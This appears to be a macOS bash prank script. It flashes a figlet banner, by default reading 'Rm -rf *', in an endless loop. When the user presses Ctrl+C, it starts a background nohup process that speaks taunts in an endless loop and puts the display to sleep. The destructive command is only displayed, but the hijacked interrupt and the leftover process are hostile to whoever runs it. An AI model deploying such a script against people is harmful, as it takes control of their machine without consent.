#!/bin/bash

time=0.4
brew install -qq figlet

i=1
export var=${1}
if [ -z $1 ]
then
    export var="Rm -rf *"
fi

other_commands() {
    echo -e "\033[1;36mGHA thajroooooooo...!\033[0m"
    sleep 2
    echo "while [ F ]; do say scar  scar   scar   spoody  spoody spoody laarbi       tige me if you can;sleep 1; done" > zero.sh
    nohup sh zero.sh & > ~/Desktop/hma9
    pmset displaysleepnow
}

trap 'other_commands' SIGINT

while $T
do
    rand=$[RANDOM % 10 + 30]
    case $[i % 6] in
        0) text=${var}. ;;
        1) text=${var}.. ;;
        2) text=${var}... ;;
        3) text=${var}.... ;;
        4) text=${var}..... ;;
        5) text=${var}.....! ;;
    esac
    figlet -f basic ${text} > pattern
    while IFS= read -r line
    do
       echo -e "\033[1;${rand}m${line}\033[0m" 
    done < pattern
    rm -rf pattern
    sleep $time
    i=$[i + 1]

done
